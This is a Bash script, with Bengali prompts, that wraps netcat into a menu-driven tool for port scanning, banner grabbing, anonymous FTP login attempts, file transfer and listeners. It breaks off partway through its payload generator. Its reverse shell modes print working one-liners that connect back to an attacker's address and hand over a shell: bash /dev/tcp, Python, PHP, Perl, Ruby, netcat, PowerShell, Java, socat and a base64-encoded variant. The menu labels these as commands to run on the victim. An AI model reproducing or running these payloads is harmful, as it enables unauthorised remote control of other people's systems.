#!/bin/bash

# ================================================================
#   NETCAT (nc) - Full Automation Tool
#   Author: SAIMUM
# ================================================================

# --- Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

RESULTS_DIR="$HOME/netcat_results"
HISTORY_FILE="$HOME/.netcat_saimum_history.log"
mkdir -p "$RESULTS_DIR"

# ================================================================
# BANNER
# ================================================================
show_banner() {
    clear
    echo -e "${GREEN}${BOLD}"
    echo ' ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗'
    echo ' ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝'
    echo ' ██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   '
    echo ' ██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   '
    echo ' ██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   '
    echo ' ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   '
    echo -e "${NC}"
    echo -e "${YELLOW}${BOLD}    ╔═══════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}${BOLD}    ║                    S A I M U M                        ║${NC}"
    echo -e "${YELLOW}${BOLD}    ╚═══════════════════════════════════════════════════════╝${NC}"
    echo -e "${DIM}${WHITE}         Netcat Full Automation Tool | Network Swiss Army Knife${NC}"
    echo ""
    echo -e "  ${RED}${BOLD}⚠  Ethics Warning:${NC} ${WHITE}শুধুমাত্র নিজের বা অনুমতি আছে এমন target এ ব্যবহার করুন।${NC}"
    echo ""
}

# ================================================================
# CHECK DEPENDENCIES
# ================================================================
check_deps() {
    echo -e "${CYAN}[*] Dependencies চেক করা হচ্ছে...${NC}"
    local missing=()

    # Check nc variants
    NC_CMD=""
    for variant in nc ncat netcat; do
        if command -v "$variant" &>/dev/null; then
            NC_CMD="$variant"
            echo -e "  ${GREEN}[✓] $variant — found${NC}"
            break
        fi
    done
    if [ -z "$NC_CMD" ]; then
        missing+=("netcat")
        echo -e "  ${RED}[✗] netcat / nc / ncat — পাওয়া যায়নি${NC}"
    fi

    for tool in curl whois dig; do
        if ! command -v "$tool" &>/dev/null; then
            missing+=("$tool")
            echo -e "  ${RED}[✗] $tool — পাওয়া যায়নি${NC}"
        else
            echo -e "  ${GREEN}[✓] $tool${NC}"
        fi
    done

    # Optional
    echo ""
    echo -e "${CYAN}[*] Optional tools:${NC}"
    for opt in nmap socat python3; do
        if command -v "$opt" &>/dev/null; then
            echo -e "  ${GREEN}[✓] $opt — available${NC}"
        else
            echo -e "  ${YELLOW}[!] $opt — নেই (optional)${NC}"
        fi
    done

    if [ ${#missing[@]} -ne 0 ]; then
        echo ""
        echo -e "${RED}[!] Missing: ${missing[*]}${NC}"
        echo -e "${YELLOW}Install করুন: sudo apt install netcat-openbsd ncat${NC}"
        exit 1
    fi

    # Detect nc version/features
    echo ""
    echo -e "${CYAN}[*] Netcat variant: ${GREEN}$NC_CMD${NC}"
    if $NC_CMD -h 2>&1 | grep -q "\-e"; then
        NC_HAS_E=true
        echo -e "  ${GREEN}[✓] -e flag supported (exec mode)${NC}"
    else
        NC_HAS_E=false
        echo -e "  ${YELLOW}[!] -e flag নেই (OpenBSD version — mkfifo দিয়ে reverse shell করতে হবে)${NC}"
    fi
    echo ""
}

# ================================================================
# GET TARGET
# ================================================================
get_target() {
    TARGET=""
    TARGET_PORT=""

    echo -e "${GREEN}${BOLD}╔══════════════════════════════════════╗${NC}"
    echo -e "${GREEN}${BOLD}║         TARGET SELECT                ║${NC}"
    echo -e "${GREEN}${BOLD}╚══════════════════════════════════════╝${NC}"
    echo ""
    read -p "$(echo -e ${WHITE}"Target IP / Domain দিন: "${NC})" t
    TARGET=$(echo "$t" | sed 's|https\?://||' | cut -d'/' -f1)

    read -p "$(echo -e ${WHITE}"Port দিন (Enter=skip for listener modes): "${NC})" p
    TARGET_PORT="$p"
    echo ""
}

# ================================================================
# WHOIS LOOKUP
# ================================================================
whois_lookup() {
    local target=$1
    echo -e "${MAGENTA}${BOLD}┌─── WHOIS INFORMATION ─────────────────────────────┐${NC}"
    local result
    result=$(whois "$target" 2>/dev/null | grep -E \
        "Registrar:|Country:|Organization:|NetName:|CIDR:|inetnum:" \
        | head -10)
    if [ -n "$result" ]; then
        echo "$result" | while IFS= read -r line; do
            echo -e "  ${WHITE}$line${NC}"
        done
    else
        echo -e "  ${YELLOW}[!] Whois data পাওয়া যায়নি।${NC}"
    fi
    echo -e "${MAGENTA}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# GEOIP LOOKUP
# ================================================================
geoip_lookup() {
    local target=$1
    echo -e "${BLUE}${BOLD}┌─── GEO IP INFORMATION ────────────────────────────┐${NC}"
    local geo
    geo=$(curl -s --max-time 5 "http://ip-api.com/json/$target" 2>/dev/null)
    if echo "$geo" | grep -q '"status":"success"'; then
        local ip country city isp
        ip=$(echo      "$geo" | grep -o '"query":"[^"]*"'   | cut -d'"' -f4)
        country=$(echo "$geo" | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
        city=$(echo    "$geo" | grep -o '"city":"[^"]*"'    | cut -d'"' -f4)
        isp=$(echo     "$geo" | grep -o '"isp":"[^"]*"'     | cut -d'"' -f4)
        echo -e "  ${WHITE}IP      :${NC} ${GREEN}$ip${NC}"
        echo -e "  ${WHITE}Country :${NC} ${GREEN}$country${NC}"
        echo -e "  ${WHITE}City    :${NC} ${GREEN}$city${NC}"
        echo -e "  ${WHITE}ISP     :${NC} ${GREEN}$isp${NC}"
    else
        echo -e "  ${YELLOW}[!] GeoIP data পাওয়া যায়নি।${NC}"
    fi
    echo -e "${BLUE}${BOLD}└────────────────────────────────────────────────────┘${NC}"
    echo ""
}

# ================================================================
# PRE-SCAN RECON
# ================================================================
pre_scan_recon() {
    local target=$1
    echo ""
    echo -e "${GREEN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${GREEN}${BOLD}   PRE-SCAN RECON  ›  $target${NC}"
    echo -e "${GREEN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    whois_lookup  "$target"
    geoip_lookup  "$target"
}

# ================================================================
# SCAN MENU
# ================================================================
show_menu() {
    echo -e "${YELLOW}${BOLD}╔══════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}${BOLD}║                    NETCAT MODE OPTIONS                              ║${NC}"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ PORT SCANNING ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}1${NC}  Single Port Check          — একটি port open কিনা দেখো"
    echo -e "${YELLOW}║${NC} ${GREEN}2${NC}  Port Range Scan            — range এর সব port check"
    echo -e "${YELLOW}║${NC} ${GREEN}3${NC}  Common Ports Scan          — সবচেয়ে common ২০টি port"
    echo -e "${YELLOW}║${NC} ${GREEN}4${NC}  UDP Port Scan              — UDP port check"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ BANNER GRABBING ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}5${NC}  Banner Grab (Single Port)  — service banner নিয়ে আসো"
    echo -e "${YELLOW}║${NC} ${GREEN}6${NC}  HTTP Banner Grab           — web server info"
    echo -e "${YELLOW}║${NC} ${GREEN}7${NC}  SMTP Banner Grab           — mail server info"
    echo -e "${YELLOW}║${NC} ${GREEN}8${NC}  FTP Banner Grab            — FTP server info"
    echo -e "${YELLOW}║${NC} ${GREEN}9${NC}  SSH Banner Grab            — SSH version info"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ LISTENER / TRANSFER ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}10${NC} Start TCP Listener          — port এ listen শুরু করো"
    echo -e "${YELLOW}║${NC} ${GREEN}11${NC} File Send (Client)          — target এ file পাঠাও"
    echo -e "${YELLOW}║${NC} ${GREEN}12${NC} File Receive (Listener)     — file receive করার জন্য listen"
    echo -e "${YELLOW}║${NC} ${GREEN}13${NC} Chat Mode (Listener)        — two-way chat listener"
    echo -e "${YELLOW}║${NC} ${GREEN}14${NC} Chat Mode (Connect)         — listener এ connect করো"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ REVERSE / BIND SHELL ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}15${NC} Reverse Shell Listener      — attacker side listener"
    echo -e "${YELLOW}║${NC} ${GREEN}16${NC} Reverse Shell Payload Gen   — victim এ চালানোর command"
    echo -e "${YELLOW}║${NC} ${GREEN}17${NC} Bind Shell Listener         — victim এ bind shell চালাও"
    echo -e "${YELLOW}║${NC} ${GREEN}18${NC} Bind Shell Connect          — bind shell এ connect করো"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ PROXY / TUNNEL / RELAY ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}19${NC} TCP Port Relay              — port forwarding / relay"
    echo -e "${YELLOW}║${NC} ${GREEN}20${NC} HTTP Proxy Test             — HTTP proxy üzerinden bağlan"
    echo -e "${YELLOW}║${NC} ${GREEN}21${NC} Persistent Listener Loop    — connection পড়লেও restart হয়"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ WEB / SERVICE INTERACTION ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}22${NC} Raw HTTP GET Request        — manual HTTP request"
    echo -e "${YELLOW}║${NC} ${GREEN}23${NC} Raw HTTP POST Request       — manual POST request"
    echo -e "${YELLOW}║${NC} ${GREEN}24${NC} SMTP Manual Test            — manual SMTP command"
    echo -e "${YELLOW}║${NC} ${GREEN}25${NC} Custom Raw Command Send     — যেকোনো raw data পাঠাও"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}━━━ SPECIAL MODES ━━━${NC}"
    echo -e "${YELLOW}║${NC} ${GREEN}26${NC} Zero-I/O Mode (Port Alive)  — শুধু port alive কিনা দেখো"
    echo -e "${YELLOW}║${NC} ${GREEN}27${NC} Multiple Ports একসাথে      — একাধিক port একসাথে"
    echo -e "${YELLOW}║${NC} ${GREEN}28${NC} All-in-One Recon            — সব scan একসাথে"
    echo -e "${YELLOW}${BOLD}╠══════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${YELLOW}║${NC}  ${RED}0)${NC} Exit                                                               ${YELLOW}║${NC}"
    echo -e "${YELLOW}${BOLD}╚══════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# ================================================================
# HELPER: SAVE OUTPUT
# ================================================================
init_output() {
    local label=$1
    local ts
    ts=$(date +"%Y%m%d_%H%M%S")
    local safe
    safe=$(echo "${TARGET:-listener}" | sed 's/[^a-zA-Z0-9._-]/_/g')
    OUTPUT_FILE="$RESULTS_DIR/${label}_${safe}_${ts}.txt"
    SCAN_LABEL="$label"
}

# ================================================================
# MODE 1 — SINGLE PORT CHECK
# ================================================================
mode_single_port() {
    local target=$1 port=$2
    [ -z "$port" ] && read -p "$(echo -e ${WHITE}"Port দিন: "${NC})" port
    init_output "SinglePort"

    echo ""
    echo -e "${CYAN}[*] $target:$port চেক করা হচ্ছে...${NC}"
    echo ""

    local tmp
    tmp=$(mktemp)
    $NC_CMD -z -w 3 "$target" "$port" 2>&1
    local exit_code=$?

    {
        echo "Target: $target | Port: $port"
        if [ $exit_code -eq 0 ]; then
            echo -e "  ${GREEN}${BOLD}[✓] Port $port — OPEN${NC}"
            echo "Status: OPEN"
        else
            echo -e "  ${RED}[✗] Port $port — CLOSED / FILTERED${NC}"
            echo "Status: CLOSED"
        fi
    } | tee "$tmp"

    bangla_analysis_port "$tmp" "$target"
    suggest_next_tool_port "$tmp" "$target" "$port"
    save_results "$tmp"
    rm -f "$tmp"
}

# ================================================================
# MODE 2 — PORT RANGE SCAN
# ================================================================
mode_port_range() {
    local target=$1
    read -p "$(echo -e ${WHITE}"Start port দিন: "${NC})" start_port
    read -p "$(echo -e ${WHITE}"End port দিন: "${NC})" end_port
    init_output "PortRange"

    local tmp
    tmp=$(mktemp)

    echo ""
    echo -e "${CYAN}[*] $target এ port $start_port-$end_port scan করা হচ্ছে...${NC}"
    echo -e "${YELLOW}[!] এটি সময় নিতে পারে...${NC}"
    echo ""

    local open_ports=()
    for port in $(seq "$start_port" "$end_port"); do
        $NC_CMD -z -w 1 "$target" "$port" 2>/dev/null
        if [ $? -eq 0 ]; then
            open_ports+=("$port")
            echo -e "  ${GREEN}[✓] Port $port — OPEN${NC}"
            echo "OPEN: $port" >> "$tmp"
        fi
    done

    echo ""
    echo -e "${GREEN}[✓] Scan সম্পন্ন!${NC}"
    echo -e "  ${WHITE}মোট open ports: ${GREEN}${#open_ports[@]}${NC}"

    bangla_analysis_range "$tmp" "$target" "${open_ports[@]}"
    suggest_next_tool_range "$tmp" "$target"
    save_results "$tmp"
    rm -f "$tmp"
}

# ================================================================
# MODE 3 — COMMON PORTS SCAN
# ================================================================
mode_common_ports() {
    local target=$1
    init_output "CommonPorts"

    local common_ports=(21 22 23 25 53 80 110 139 143 443 445 3306 3389 5432 5900 6379 8080 8443 8888 27017)
    local tmp
    tmp=$(mktemp)
    local open_ports=()

    echo ""
    echo -e "${CYAN}[*] $target এ common ports scan করা হচ্ছে...${NC}"
    echo ""

    for port in "${common_ports[@]}"; do
        $NC_CMD -z -w 2 "$target" "$port" 2>/dev/null
        if [ $? -eq 0 ]; then
            open_ports+=("$port")
            local service=""
            case $port in
                21) service="FTP" ;; 22) service="SSH" ;; 23) service="Telnet" ;;
                25) service="SMTP" ;; 53) service="DNS" ;; 80) service="HTTP" ;;
                110) service="POP3" ;; 139) service="NetBIOS" ;; 143) service="IMAP" ;;
                443) service="HTTPS" ;; 445) service="SMB" ;; 3306) service="MySQL" ;;
                3389) service="RDP" ;; 5432) service="PostgreSQL" ;; 5900) service="VNC" ;;
                6379) service="Redis" ;; 8080) service="HTTP-Alt" ;; 8443) service="HTTPS-Alt" ;;
                8888) service="HTTP-Dev" ;; 27017) service="MongoDB" ;;
            esac
            echo -e "  ${GREEN}[✓] Port $port ($service) — OPEN${NC}"
            echo "OPEN: $port ($service)" >> "$tmp"
        else
            echo -e "  ${RED}[✗] Port $port — closed${NC}"
        fi
    done

    echo ""
    echo -e "${GREEN}[✓] Scan সম্পন্ন!${NC}"
    echo -e "  ${WHITE}Open ports: ${GREEN}${#open_ports[@]} / ${#common_ports[@]}${NC}"

    bangla_analysis_range "$tmp" "$target" "${open_ports[@]}"
    suggest_next_tool_range "$tmp" "$target"
    save_results "$tmp"
    rm -f "$tmp"
}

# ================================================================
# MODE 4 — UDP SCAN
# ================================================================
mode_udp_scan() {
    local target=$1
    read -p "$(echo -e ${WHITE}"UDP Port দিন: "${NC})" port
    init_output "UDPScan"

    echo ""
    echo -e "${CYAN}[*] UDP port $port চেক করা হচ্ছে...${NC}"
    echo -e "${YELLOW}[!] UDP scan সময় নিতে পারে এবং result সবসময় accurate নাও হতে পারে।${NC}"
    echo ""

    local tmp
    tmp=$(mktemp)

    $NC_CMD -u -z -w 3 "$target" "$port" 2>&1 | tee "$tmp"
    local exit_code=${PIPESTATUS[0]}

    if [ $exit_code -eq 0 ]; then
        echo -e "  ${GREEN}[✓] UDP Port $port — OPEN/FILTERED${NC}"
    else
        echo -e "  ${YELLOW}[!] UDP Port $port — CLOSED বা FILTERED${NC}"
    fi

    save_results "$tmp"
    rm -f "$tmp"
}

# ================================================================
# MODE 5 — BANNER GRAB SINGLE PORT
# ================================================================
mode_banner_grab() {
    local target=$1 port=$2
    [ -z "$port" ] && read -p "$(echo -e ${WHITE}"Port দিন: "${NC})" port
    init_output "BannerGrab"

    echo ""
    echo -e "${CYAN}[*] $target:$port এর banner নেওয়া হচ্ছে...${NC}"
    echo ""

    local tmp
    tmp=$(mktemp)

    echo "" | $NC_CMD -w 5 "$target" "$port" 2>&1 | head -20 | tee "$tmp"

    echo ""
    bangla_analysis_banner "$tmp" "$target" "$port"
    suggest_next_tool_banner "$tmp" "$target" "$port"
    save_results "$tmp"
    rm -f "$tmp"
}

# ================================================================
# MODE 6 — HTTP BANNER GRAB
# ================================================================
mode_http_banner() {
    local target=$1
    local port="${TARGET_PORT:-80}"
    [ -z "$TARGET_PORT" ] && read -p "$(echo -e ${WHITE}"Port (Enter=80): "${NC})" port
    [ -z "$port" ] && port=80
    init_output "HTTPBanner"

    echo ""
    echo -e "${CYAN}[*] HTTP Banner grab: $target:$port${NC}"
    echo ""

    local tmp
    tmp=$(mktemp)

    printf "HEAD / HTTP/1.0\r\nHost: %s\r\n\r\n" "$target" | \
        $NC_CMD -w 5 "$target" "$port" 2>&1 | head -30 | tee "$tmp"

    echo ""
    bangla_analysis_banner "$tmp" "$target" "$port"
    suggest_next_tool_banner "$tmp" "$target" "$port"
    save_results "$tmp"
    rm -f "$tmp"
}

# ================================================================
# MODE 7 — SMTP BANNER GRAB
# ================================================================
mode_smtp_banner() {
    local target=$1
    local port="${TARGET_PORT:-25}"
    [ -z "$TARGET_PORT" ] && read -p "$(echo -e ${WHITE}"SMTP Port (Enter=25): "${NC})" port
    [ -z "$port" ] && port=25
    init_output "SMTPBanner"

    echo ""
    echo -e "${CYAN}[*] SMTP Banner grab: $target:$port${NC}"
    echo ""

    local tmp
    tmp=$(mktemp)

    {
        sleep 2
        echo "EHLO test.com"
        sleep 1
        echo "QUIT"
    } | $NC_CMD -w 8 "$target" "$port" 2>&1 | tee "$tmp"

    echo ""
    bangla_analysis_banner "$tmp" "$target" "$port"
    save_results "$tmp"
    rm -f "$tmp"
}

# ================================================================
# MODE 8 — FTP BANNER GRAB
# ================================================================
mode_ftp_banner() {
    local target=$1
    local port="${TARGET_PORT:-21}"
    init_output "FTPBanner"

    echo ""
    echo -e "${CYAN}[*] FTP Banner grab: $target:$port${NC}"
    echo ""

    local tmp
    tmp=$(mktemp)

    {
        sleep 2
        echo "USER anonymous"
        sleep 1
        echo "PASS anonymous@test.com"
        sleep 1
        echo "QUIT"
    } | $NC_CMD -w 8 "$target" "$port" 2>&1 | tee "$tmp"

    echo ""
    if grep -q "230" "$tmp" 2>/dev/null; then
        echo -e "  ${RED}${BOLD}[!] Anonymous FTP login সফল! ঝুঁকি: CRITICAL${NC}"
    elif grep -q "220" "$tmp" 2>/dev/null; then
        echo -e "  ${YELLOW}[!] FTP সার্ভার পাওয়া গেছে।${NC}"
    fi
    bangla_analysis_banner "$tmp" "$target" "$port"
    save_results "$tmp"
    rm -f "$tmp"
}

# ================================================================
# MODE 9 — SSH BANNER GRAB
# ================================================================
mode_ssh_banner() {
    local target=$1
    local port="${TARGET_PORT:-22}"
    init_output "SSHBanner"

    echo ""
    echo -e "${CYAN}[*] SSH Banner grab: $target:$port${NC}"
    echo ""

    local tmp
    tmp=$(mktemp)

    $NC_CMD -w 5 "$target" "$port" 2>&1 | head -5 | tee "$tmp"

    echo ""
    if grep -qi "SSH" "$tmp" 2>/dev/null; then
        local ver
        ver=$(grep -i "SSH" "$tmp" | head -1)
        echo -e "  ${CYAN}[*] SSH Version: ${YELLOW}$ver${NC}"
    fi
    bangla_analysis_banner "$tmp" "$target" "$port"
    save_results "$tmp"
    rm -f "$tmp"
}

# ================================================================
# MODE 10 — TCP LISTENER
# ================================================================
mode_tcp_listener() {
    local port
    read -p "$(echo -e ${WHITE}"Listen port দিন: "${NC})" port
    init_output "TCPListener"

    echo ""
    echo -e "${GREEN}${BOLD}[*] TCP Listener শুরু হচ্ছে port $port এ...${NC}"
    echo -e "${YELLOW}[!] Connection আসলে দেখাবে। বন্ধ করতে Ctrl+C চাপুন।${NC}"
    echo ""
    echo -e "${CYAN}কমান্ড: $NC_CMD -lvnp $port${NC}"
    echo ""

    $NC_CMD -lvnp "$port"
}

# ================================================================
# MODE 11 — FILE SEND
# ================================================================
mode_file_send() {
    local target=$1
    local port
    read -p "$(echo -e ${WHITE}"Target port দিন: "${NC})" port
    read -p "$(echo -e ${WHITE}"File path দিন (পাঠাবেন যেটা): "${NC})" filepath

    if [ ! -f "$filepath" ]; then
        echo -e "${RED}[!] File পাওয়া যায়নি।${NC}"
        return
    fi

    echo ""
    echo -e "${CYAN}[*] $filepath পাঠানো হচ্ছে $target:$port এ...${NC}"
    echo ""

    $NC_CMD -w 10 "$target" "$port" < "$filepath"
    echo -e "${GREEN}[✓] File পাঠানো সম্পন্ন!${NC}"
    echo "$(date) | File Send | $filepath → $target:$port" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 12 — FILE RECEIVE
# ================================================================
mode_file_receive() {
    local port
    read -p "$(echo -e ${WHITE}"Listen port দিন: "${NC})" port
    read -p "$(echo -e ${WHITE}"Save করার file name দিন: "${NC})" savefile
    savefile="${savefile:-$RESULTS_DIR/received_$(date +%Y%m%d_%H%M%S).bin}"

    echo ""
    echo -e "${GREEN}${BOLD}[*] File receive করার জন্য listen করা হচ্ছে port $port এ...${NC}"
    echo -e "${YELLOW}[!] Sender এ চালাবে: ${CYAN}nc $HOSTNAME $port < <file>${NC}"
    echo ""

    $NC_CMD -lvnp "$port" > "$savefile"
    echo -e "${GREEN}[✓] File received → $savefile${NC}"
    echo "$(date) | File Receive | port:$port → $savefile" >> "$HISTORY_FILE"
}

# ================================================================
# MODE 13 — CHAT LISTENER
# ================================================================
mode_chat_listener() {
    local port
    read -p "$(echo -e ${WHITE}"Chat listen port দিন: "${NC})" port

    echo ""
    echo -e "${GREEN}${BOLD}[*] Chat listener শুরু হচ্ছে port $port এ...${NC}"
    echo -e "${YELLOW}[!] অপর প্রান্তে চালাবে: ${CYAN}nc <your-ip> $port${NC}"
    echo -e "${YELLOW}[!] বন্ধ করতে Ctrl+C${NC}"
    echo ""

    $NC_CMD -lvnp "$port"
}

# ================================================================
# MODE 14 — CHAT CONNECT
# ================================================================
mode_chat_connect() {
    local target=$1
    local port
    read -p "$(echo -e ${WHITE}"Connect করার port দিন: "${NC})" port

    echo ""
    echo -e "${GREEN}${BOLD}[*] $target:$port এ connect করা হচ্ছে...${NC}"
    echo -e "${YELLOW}[!] বন্ধ করতে Ctrl+C${NC}"
    echo ""

    $NC_CMD "$target" "$port"
}

# ================================================================
# MODE 15 — REVERSE SHELL LISTENER
# ================================================================
mode_reverse_shell_listener() {
    local port
    read -p "$(echo -e ${WHITE}"Listen port দিন (reverse shell আসবে এখানে): "${NC})" port
    init_output "ReverseShellListener"

    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          REVERSE SHELL LISTENER                         ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${GREEN}[*] Listening on port: ${YELLOW}$port${NC}"
    echo -e "  ${WHITE}Victim এ এই command চালাতে হবে:${NC}"
    echo ""

    # Get attacker IP
    local my_ip
    my_ip=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
    echo -e "  ${CYAN}━━━ Reverse Shell Payloads ━━━${NC}"
    echo -e "  ${WHITE}Bash:${NC}"
    echo -e "    ${YELLOW}bash -i >& /dev/tcp/$my_ip/$port 0>&1${NC}"
    echo ""
    echo -e "  ${WHITE}Python:${NC}"
    echo -e "    ${YELLOW}python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$my_ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'${NC}"
    echo ""
    echo -e "  ${WHITE}PHP:${NC}"
    echo -e "    ${YELLOW}php -r '\$sock=fsockopen(\"$my_ip\",$port);\$proc=proc_open(\"/bin/sh -i\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);'${NC}"
    echo ""
    echo -e "  ${WHITE}Perl:${NC}"
    echo -e "    ${YELLOW}perl -e 'use Socket;\$i=\"$my_ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'${NC}"
    echo ""
    echo -e "  ${WHITE}Netcat (with -e):${NC}"
    echo -e "    ${YELLOW}nc $my_ip $port -e /bin/bash${NC}"
    echo ""
    echo -e "  ${WHITE}Netcat (mkfifo — OpenBSD):${NC}"
    echo -e "    ${YELLOW}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $my_ip $port >/tmp/f${NC}"
    echo ""
    echo -e "${GREEN}${BOLD}[*] Listener চালু হচ্ছে... connection এর জন্য অপেক্ষা করুন।${NC}"
    echo ""

    $NC_CMD -lvnp "$port"
}

# ================================================================
# MODE 16 — REVERSE SHELL PAYLOAD GENERATOR
# ================================================================
mode_reverse_shell_payload() {
    echo ""
    echo -e "${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}${BOLD}║          REVERSE SHELL PAYLOAD GENERATOR                ║${NC}"
    echo -e "${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    local my_ip
    my_ip=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
    read -p "$(echo -e ${WHITE}"Attacker IP (Enter=$my_ip): "${NC})" ip_in
    [ -n "$ip_in" ] && my_ip="$ip_in"
    read -p "$(echo -e ${WHITE}"Listen Port দিন: "${NC})" port

    local ts
    ts=$(date +"%Y%m%d_%H%M%S")
    local payload_file="$RESULTS_DIR/payloads_${ts}.txt"

    {
    echo "================================================================"
    echo "  REVERSE SHELL PAYLOADS  —  SAIMUM"
    echo "  Attacker IP: $my_ip | Port: $port"
    echo "  Date: $(date)"
    echo "================================================================"
    echo ""
    echo "=== BASH ==="
    echo "bash -i >& /dev/tcp/$my_ip/$port 0>&1"
    echo ""
    echo "=== BASH (encoded) ==="
    echo "bash -c {echo,$(echo -n "bash -i >& /dev/tcp/$my_ip/$port 0>&1" | base64)}|{base64,-d}|bash"
    echo ""
    echo "=== PYTHON 3 ==="
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$my_ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
    echo ""
    echo "=== PYTHON 2 ==="
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$my_ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
    echo ""
    echo "=== PHP ==="
    echo "php -r '\$sock=fsockopen(\"$my_ip\",$port);\$proc=proc_open(\"/bin/sh -i\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);'"
    echo ""
    echo "=== PERL ==="
    echo "perl -e 'use Socket;\$i=\"$my_ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
    echo ""
    echo "=== RUBY ==="
    echo "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$my_ip\",$port);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
    echo ""
    echo "=== NETCAT (with -e) ==="
    echo "nc $my_ip $port -e /bin/bash"
    echo ""
    echo "=== NETCAT (mkfifo) ==="
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $my_ip $port >/tmp/f"
    echo ""
    echo "=== POWERSHELL (Windows) ==="
    echo "\$client = New-Object System.Net.Sockets.TCPClient('$my_ip',$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    echo ""
    echo "=== JAVA ==="
    echo "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$my_ip/$port;cat <&5 | while read line; do \\\$line 2>&5 >&5; done\"] as String[]);p.waitFor()"
    echo ""
    echo "=== SOCAT ==="
    echo "socat TCP:$my_ip:$port EXEC:/bin/bash"
    echo ""
    echo "=== LISTENER COMMAND (Attacker Side) ==="
    echo "nc -lvnp $port"
    } | tee "$payload_file"

    echo ""
